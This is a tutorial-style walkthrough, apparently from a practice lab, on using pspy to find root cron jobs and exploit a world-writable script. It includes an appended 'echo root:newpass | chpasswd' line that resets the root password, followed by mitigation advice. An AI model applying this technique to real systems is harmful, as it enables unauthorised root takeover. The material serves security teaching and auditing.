# Privilege Escalation via Cron Job Discovery with pspy

## Overview

Automated privilege escalation enumeration scripts (LinPEAS, LinEnum, etc.) only capture a
**snapshot** of the system at execution time. They cannot see short-lived background
processes — such as cron jobs or scheduled scripts — that spawn and exit within
milliseconds. This is the gap that **pspy** fills.

[pspy](https://github.com/dominicbreuker/pspy) is a process monitoring tool that lets
unprivileged users observe running processes, cron jobs, and commands executed by other
users in real time, without requiring root privileges.

## Why Polling Fails

On Linux, low-privileged users can only see their own processes via `/proc` by default.
Short-lived tasks may start and terminate before a polling-based tool ever gets a chance
to inspect `/proc`, making traditional "check every N seconds" enumeration unreliable for
discovering cron-driven activity.

## How pspy Works (Event-Driven Approach)

Rather than polling on an interval, pspy:

1. Sets `inotify` watches on commonly accessed directories (e.g. `/etc`, `/tmp`, `/usr`, `/var`).
2. Detects filesystem activity (file creation, modification, execution triggers) in those directories.
3. Immediately scans `/proc` to identify any new process, capturing its UID, PID, timestamp, and full command line — even for processes owned by other users.

This works because process metadata in `/proc` is briefly visible to unprivileged users
during a process's lifetime. pspy does not bypass any kernel permission checks — it simply
reacts fast enough to catch what polling-based tools miss.

## Running pspy

```bash
./pspy64
```

After a short delay, pspy will begin streaming process activity system-wide, including
processes spawned by root.

Example output:

```
2026/02/10 06:40:11 CMD: UID=0     PID=1      | /sbin/init
2026/02/10 06:40:16 CMD: UID=0     PID=1937   | /bin/bash /root/run-backup.sh
2026/02/10 06:40:16 CMD: UID=0     PID=1938   | tar -czf /var/backup/syslog.tar.gz /var/log/syslog
2026/02/10 06:40:16 CMD: UID=0     PID=1939   | /bin/sh -c gzip
2026/02/10 06:40:16 CMD: UID=0     PID=1940   | gzip
2026/02/10 06:40:16 CMD: UID=0     PID=1941   | sleep 10
2026/02/10 06:40:16 CMD: UID=0     PID=1942   | /bin/bash /root/run-rm-tmp.sh
2026/02/10 06:40:16 CMD: UID=0     PID=1943   | /bin/bash /usr/local/bin/rm-tmp.sh
2026/02/10 06:40:16 CMD: UID=0     PID=1944   | /bin/bash /usr/local/bin/rm-tmp.sh
2026/02/10 06:40:16 CMD: UID=0     PID=1946   | chpasswd
2026/02/10 06:40:16 CMD: UID=0     PID=1948   | /bin/bash /root/run-rm-tmp.sh
```

Two scripts stand out:

- `/root/run-rm-tmp.sh` — lives inside `/root`, inaccessible to low-privileged users.
- `/usr/local/bin/rm-tmp.sh` — called by the above script, and located in a
  world-accessible path.

## Identifying the Misconfiguration

```bash
john@privesc:~$ ls -la /usr/local/bin/rm-tmp.sh
-rwxrwxrwx 1 root root 57 Jan 20 10:27 /usr/local/bin/rm-tmp.sh

john@privesc:~$ cat /usr/local/bin/rm-tmp.sh
#!/bin/bash

rm -r /tmp/*
```

Key findings:

- The script is **world-writable** (`rwxrwxrwx`).
- It is executed **as root**, on a recurring schedule (cron/loop).
- It is intended only to clear `/tmp`, but nothing prevents modification.

## Exploitation

Because any user can write to the script, and it is executed as root, an attacker can
append arbitrary commands that will run with root privileges the next time the cron job
fires:

```bash
#!/bin/bash

rm -r /tmp/*
echo "root:newpass" | chpasswd
```

Once the scheduled job runs again, the appended command executes as root, resetting the
root password.

## Gaining Root Access

```bash
john@privesc:~$ su
Password:
root@privesc:/home/john#
```

## Key Takeaways

- **Static enumeration tools miss ephemeral processes.** Cron jobs and short-lived scripts
  need an event-driven observer like pspy to be discovered reliably.
- **World-writable files executed by privileged accounts are a critical risk**, even if the
  file itself looks benign (e.g., a simple `rm` cleanup script).
- **Always audit script permissions** referenced by cron jobs, systemd timers, or root-owned
  wrapper scripts — a single `chmod 777` mistake can lead to full system compromise.
- **Mitigation:** Ensure scripts run by privileged users are owned by root and writable only
  by root (`chmod 700` or `750` as appropriate), and audit cron entries (`crontab -l`,
  `/etc/cron.d/`, `/etc/crontab`) regularly for scripts with insecure permissions.

## Tool Reference

- pspy GitHub repository: <https://github.com/dominicbreuker/pspy>
